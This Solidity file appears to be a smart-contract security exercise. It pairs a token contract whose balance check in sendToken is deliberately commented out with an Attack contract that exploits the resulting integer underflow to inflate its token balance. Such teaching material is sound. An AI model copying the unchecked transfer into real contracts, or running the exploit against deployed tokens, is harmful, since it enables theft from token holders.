
pragma solidity ^0.4.10;

//*** Exercice 1 ***//
// Simple token you can buy and send.
contract SimpleToken{
    mapping(address => uint) public balances;

    /// @dev Buy token at the price of 1ETH/token.
    function buyToken() payable {
        balances[msg.sender]+=msg.value / 1 ether;
    }

    /** @dev Send token.
     *  @param _recipient The recipient.
     *  @param _amount The amount to send.
     */
    function sendToken(address _recipient, uint _amount) public{
        require(balances[msg.sender]!=0); // You must have some tokens.


       //Also, we need this require statement here.
       //require(balances[msg.sender]>=_amount && balances[_recipient] + _amount >= balances[_recipient]);
        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }
}

contract Attack {
    SimpleToken simpleToken;
    uint public balance;
    function Attack(address _address){
        simpleToken = SimpleToken(_address);

    }

    //IMPORTANT this function needs 1 Ether for attack.
    //It will explode if we send a value higher than the current balance.
    function hack() payable{
        simpleToken.buyToken.value(1 ether)();
        simpleToken.sendToken(msg.sender,msg.value+1);
        balance = simpleToken.balances(this);
    }
}
